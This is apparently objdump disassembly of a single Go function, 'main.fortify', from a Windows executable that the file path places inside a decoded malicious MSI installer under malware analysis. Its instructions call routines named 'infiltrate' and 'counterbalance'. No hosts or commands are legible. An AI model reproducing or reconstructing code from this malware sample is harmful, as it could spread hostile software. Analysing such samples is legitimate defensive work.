
/home/ubuntu/malicious_msi_decode/analysis/extracted/support_v1.3/demand.exe:     file format pei-x86-64


Disassembly of section .text:

00000001402759c0 <.text+0x2749c0>:
   1402759c0 <main.fortify>:	4c 8d 64 24 e0       	lea    r12,[rsp-0x20]
   1402759c5:	4d 3b 66 10          	cmp    r12,QWORD PTR [r14+0x10]
   1402759c9:	0f 86 19 02 00 00    	jbe    0x140275be8
   1402759cf:	55                   	push   rbp
   1402759d0:	48 89 e5             	mov    rbp,rsp
   1402759d3:	48 81 ec 98 00 00 00 	sub    rsp,0x98
   1402759da:	e8 e1 fb ff ff       	call   0x1402755c0 <main.underscore>
   1402759df:	90                   	nop
   1402759e0:	48 85 c9             	test   rcx,rcx
   1402759e3:	0f 84 88 00 00 00    	je     0x140275a71
   1402759e9:	48 89 4c 24 38       	mov    QWORD PTR [rsp+0x38],rcx
   1402759ee:	44 0f 11 7c 24 78    	movups XMMWORD PTR [rsp+0x78],xmm15
   1402759f4:	44 0f 11 bc 24 88 00 	movups XMMWORD PTR [rsp+0x88],xmm15
   1402759fb:	00 00 
   1402759fd:	48 8d 15 7c f8 07 00 	lea    rdx,[rip+0x7f87c]        # 0x1402f5280 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xb82\\x87\\xf8\x07\x08\x08\x18\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00\x03-\x00\x00@\\xbc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x15%\\xbc\x0f\x01\x01\x03\\xb0I8@\x01\x00\x00\x00\\xe82>@'
   140275a04:	48 89 54 24 78       	mov    QWORD PTR [rsp+0x78],rdx
   140275a09:	48 8d 15 20 dd 16 00 	lea    rdx,[rip+0x16dd20]        # 0x1403e3730 '\x19P6@\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\\xa9\\xec6@\x01\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\\xf6\\x986@\x01\x00\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00[j6@\x01\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00F;7@\x01\x00\x00\x00%\x00\x00\x00\x00\x00\x00\x00\x04t7@\x01\x00\x00\x00-\x00\x00\x00\x00\x00\x00\x00\\x9fQ7@'
   140275a10:	48 89 94 24 80 00 00 	mov    QWORD PTR [rsp+0x80],rdx
   140275a17:	00 
   140275a18:	74 08                	je     0x140275a22
   140275a1a:	48 8b 51 08          	mov    rdx,QWORD PTR [rcx+0x8]
   140275a1e:	66 90                	xchg   ax,ax
   140275a20:	eb 03                	jmp    0x140275a25
   140275a22:	48 89 ca             	mov    rdx,rcx
   140275a25:	48 89 7c 24 58       	mov    QWORD PTR [rsp+0x58],rdi
   140275a2a:	48 89 94 24 88 00 00 	mov    QWORD PTR [rsp+0x88],rdx
   140275a31:	00 
   140275a32:	48 89 bc 24 90 00 00 	mov    QWORD PTR [rsp+0x90],rdi
   140275a39:	00 
   140275a3a:	48 8b 1d cf 9f 39 00 	mov    rbx,QWORD PTR [rip+0x399fcf]        # 0x14060fa10 ''
   140275a41:	48 8d 05 18 02 17 00 	lea    rax,[rip+0x170218]        # 0x1403e5c60 '@\\xb30@\x01\x00\x00\x00\\xe0\\xc35@\x01\x00\x00\x00Z\\xdd\x11\\x9f\x00\x00\x00\x00`\\xa4\r@\x01\x00\x00\x00\\xc0\\xdc0@\x01\x00\x00\x00\\x80R2@\x01\x00\x00\x00\x7fJo\\xf6\x00\x00\x00\x00\\xa0\\xc3\n@\x01\x00\x00\x00\\xc0\\xdc0@\x01\x00\x00\x00\\xe0:0@\x01\x00\x00\x00\\xae3`\\xc7\x00\x00\x00\x00 \x1e\x10@\x01\x00\x00\x00\\xc0\\xdc0@'
   140275a48:	48 8d 4c 24 78       	lea    rcx,[rsp+0x78]
   140275a4d:	bf 02 00 00 00       	mov    edi,0x2
   140275a52:	48 89 fe             	mov    rsi,rdi
   140275a55:	e8 46 dd e6 ff       	call   0x1400e37a0 <fmt.Fprintln>
   140275a5a:	31 c0                	xor    eax,eax
   140275a5c:	31 db                	xor    ebx,ebx
   140275a5e:	48 8b 4c 24 38       	mov    rcx,QWORD PTR [rsp+0x38]
   140275a63:	48 8b 7c 24 58       	mov    rdi,QWORD PTR [rsp+0x58]
   140275a68:	48 81 c4 98 00 00 00 	add    rsp,0x98
   140275a6f:	5d                   	pop    rbp
   140275a70:	c3                   	ret
   140275a71:	48 89 5c 24 40       	mov    QWORD PTR [rsp+0x40],rbx
   140275a76:	48 89 44 24 60       	mov    QWORD PTR [rsp+0x60],rax
   140275a7b:	31 c0                	xor    eax,eax
   140275a7d:	31 db                	xor    ebx,ebx
   140275a7f:	31 c9                	xor    ecx,ecx
   140275a81:	48 8d 3d ee 5b 10 00 	lea    rdi,[rip+0x105bee]        # 0x14037b676 '===========================================================\ncalled CompareAndDelete when value is no'
   140275a88:	be 3c 00 00 00       	mov    esi,0x3c
   140275a8d:	e8 0e 45 de ff       	call   0x140059fa0 <runtime.concatstring2>
   140275a92:	48 89 d9             	mov    rcx,rbx
   140275a95:	48 8b 7c 24 60       	mov    rdi,QWORD PTR [rsp+0x60]
   140275a9a:	48 8b 74 24 40       	mov    rsi,QWORD PTR [rsp+0x40]
   140275a9f:	4c 8d 05 ba c5 16 00 	lea    r8,[rip+0x16c5ba]        # 0x1403e2060 '\n\x00\x00\x00\x00\x00\x00\x00J)\\xa5\\x94R\x00\x00\x00\\xa5\\x94RJ)\x00\x00\x002333\x01\x00\x00\x00\\x99\\x99\\x99\\x99\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xd8\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00:\x00\x00\x00\x00\x00\x00\x00[\x00\x00\x00'
   140275aa6:	41 b9 01 00 00 00    	mov    r9d,0x1
   140275aac:	48 89 c3             	mov    rbx,rax
   140275aaf:	31 c0                	xor    eax,eax
   140275ab1:	e8 8a 45 de ff       	call   0x14005a040 <runtime.concatstring3>
   140275ab6:	48 89 d9             	mov    rcx,rbx
   140275ab9:	48 8d 3d b6 5b 10 00 	lea    rdi,[rip+0x105bb6]        # 0x14037b676 '===========================================================\ncalled CompareAndDelete when value is no'
   140275ac0:	be 3c 00 00 00       	mov    esi,0x3c
   140275ac5:	48 89 c3             	mov    rbx,rax
   140275ac8:	31 c0                	xor    eax,eax
   140275aca:	e8 d1 44 de ff       	call   0x140059fa0 <runtime.concatstring2>
   140275acf:	48 89 44 24 68       	mov    QWORD PTR [rsp+0x68],rax
   140275ad4:	48 89 5c 24 48       	mov    QWORD PTR [rsp+0x48],rbx
   140275ad9:	48 8b 44 24 60       	mov    rax,QWORD PTR [rsp+0x60]
   140275ade:	48 8b 5c 24 40       	mov    rbx,QWORD PTR [rsp+0x40]
   140275ae3:	e8 38 f8 ff ff       	call   0x140275320 <main.counterbalance>
   140275ae8:	48 85 c9             	test   rcx,rcx
   140275aeb:	75 7c                	jne    0x140275b69
   140275aed:	48 8b 4c 24 48       	mov    rcx,QWORD PTR [rsp+0x48]
   140275af2:	48 89 c7             	mov    rdi,rax
   140275af5:	48 89 de             	mov    rsi,rbx
   140275af8:	4c 8d 05 61 c5 16 00 	lea    r8,[rip+0x16c561]        # 0x1403e2060 '\n\x00\x00\x00\x00\x00\x00\x00J)\\xa5\\x94R\x00\x00\x00\\xa5\\x94RJ)\x00\x00\x002333\x01\x00\x00\x00\\x99\\x99\\x99\\x99\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xd8\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00:\x00\x00\x00\x00\x00\x00\x00[\x00\x00\x00'
   140275aff:	41 b9 01 00 00 00    	mov    r9d,0x1
   140275b05:	31 c0                	xor    eax,eax
   140275b07:	48 8b 5c 24 68       	mov    rbx,QWORD PTR [rsp+0x68]
   140275b0c:	e8 2f 45 de ff       	call   0x14005a040 <runtime.concatstring3>
   140275b11:	48 89 d9             	mov    rcx,rbx
   140275b14:	48 8d 3d 5b 5b 10 00 	lea    rdi,[rip+0x105b5b]        # 0x14037b676 '===========================================================\ncalled CompareAndDelete when value is no'
   140275b1b:	be 3c 00 00 00       	mov    esi,0x3c
   140275b20:	48 89 c3             	mov    rbx,rax
   140275b23:	31 c0                	xor    eax,eax
   140275b25:	e8 76 44 de ff       	call   0x140059fa0 <runtime.concatstring2>
   140275b2a:	48 89 44 24 68       	mov    QWORD PTR [rsp+0x68],rax
   140275b2f:	48 89 5c 24 48       	mov    QWORD PTR [rsp+0x48],rbx
   140275b34:	48 8b 44 24 60       	mov    rax,QWORD PTR [rsp+0x60]
   140275b39:	48 8b 5c 24 40       	mov    rbx,QWORD PTR [rsp+0x40]
   140275b3e:	66 90                	xchg   ax,ax
   140275b40:	e8 fb fd ff ff       	call   0x140275940 <main.infiltrate>
   140275b45:	48 85 ff             	test   rdi,rdi
   140275b48:	75 0c                	jne    0x140275b56
   140275b4a:	48 8b 4c 24 48       	mov    rcx,QWORD PTR [rsp+0x48]
   140275b4f:	48 8b 54 24 68       	mov    rdx,QWORD PTR [rsp+0x68]
   140275b54:	eb 6a                	jmp    0x140275bc0
   140275b56:	31 c0                	xor    eax,eax
   140275b58:	31 db                	xor    ebx,ebx
   140275b5a:	48 89 f9             	mov    rcx,rdi
   140275b5d:	48 89 f7             	mov    rdi,rsi
   140275b60:	48 81 c4 98 00 00 00 	add    rsp,0x98
   140275b67:	5d                   	pop    rbp
   140275b68:	c3                   	ret
   140275b69:	31 c0                	xor    eax,eax
   140275b6b:	31 db                	xor    ebx,ebx
   140275b6d:	48 81 c4 98 00 00 00 	add    rsp,0x98
   140275b74:	5d                   	pop    rbp
   140275b75:	c3                   	ret
   140275b76:	48 89 5c 24 50       	mov    QWORD PTR [rsp+0x50],rbx
   140275b7b:	48 89 44 24 70       	mov    QWORD PTR [rsp+0x70],rax
   140275b80:	48 8b 38             	mov    rdi,QWORD PTR [rax]
   140275b83:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
   140275b87:	31 c0                	xor    eax,eax
   140275b89:	48 89 d3             	mov    rbx,rdx
   140275b8c:	4c 8d 05 cd c4 16 00 	lea    r8,[rip+0x16c4cd]        # 0x1403e2060 '\n\x00\x00\x00\x00\x00\x00\x00J)\\xa5\\x94R\x00\x00\x00\\xa5\\x94RJ)\x00\x00\x002333\x01\x00\x00\x00\\x99\\x99\\x99\\x99\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xd8\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00:\x00\x00\x00\x00\x00\x00\x00[\x00\x00\x00'
   140275b93:	41 b9 01 00 00 00    	mov    r9d,0x1
   140275b99:	e8 a2 44 de ff       	call   0x14005a040 <runtime.concatstring3>
   140275b9e:	48 8b 54 24 70       	mov    rdx,QWORD PTR [rsp+0x70]
   140275ba3:	48 83 c2 10          	add    rdx,0x10
   140275ba7:	4c 8b 54 24 50       	mov    r10,QWORD PTR [rsp+0x50]
   140275bac:	49 ff ca             	dec    r10
   140275baf:	48 89 d9             	mov    rcx,rbx
   140275bb2:	4c 89 d3             	mov    rbx,r10
   140275bb5:	48 89 c6             	mov    rsi,rax
   140275bb8:	48 89 d0             	mov    rax,rdx
   140275bbb:	48 89 f2             	mov    rdx,rsi
   140275bbe:	66 90                	xchg   ax,ax
   140275bc0:	48 85 db             	test   rbx,rbx
   140275bc3:	7f b1                	jg     0x140275b76
   140275bc5:	31 c0                	xor    eax,eax
   140275bc7:	48 89 d3             	mov    rbx,rdx
   140275bca:	48 8d 3d a5 5a 10 00 	lea    rdi,[rip+0x105aa5]        # 0x14037b676 '===========================================================\ncalled CompareAndDelete when value is no'
   140275bd1:	be 3c 00 00 00       	mov    esi,0x3c
   140275bd6:	e8 c5 43 de ff       	call   0x140059fa0 <runtime.concatstring2>
   140275bdb:	31 c9                	xor    ecx,ecx
   140275bdd:	31 ff                	xor    edi,edi
   140275bdf:	48 81 c4 98 00 00 00 	add    rsp,0x98
   140275be6:	5d                   	pop    rbp
   140275be7:	c3                   	ret
   140275be8:	e8 33 2d e0 ff       	call   0x140078920 <runtime.morestack_noctxt>
   140275bed:	e9 ce fd ff ff       	jmp    0x1402759c0 <main.fortify>
   140275bf2:	cc                   	int3
   140275bf3:	cc                   	int3
   140275bf4:	cc                   	int3
   140275bf5:	cc                   	int3
   140275bf6:	cc                   	int3
   140275bf7:	cc                   	int3
   140275bf8:	cc                   	int3
   140275bf9:	cc                   	int3
   140275bfa:	cc                   	int3
   140275bfb:	cc                   	int3
   140275bfc:	cc                   	int3
   140275bfd:	cc                   	int3
   140275bfe:	cc                   	int3
   140275bff:	cc                   	int3
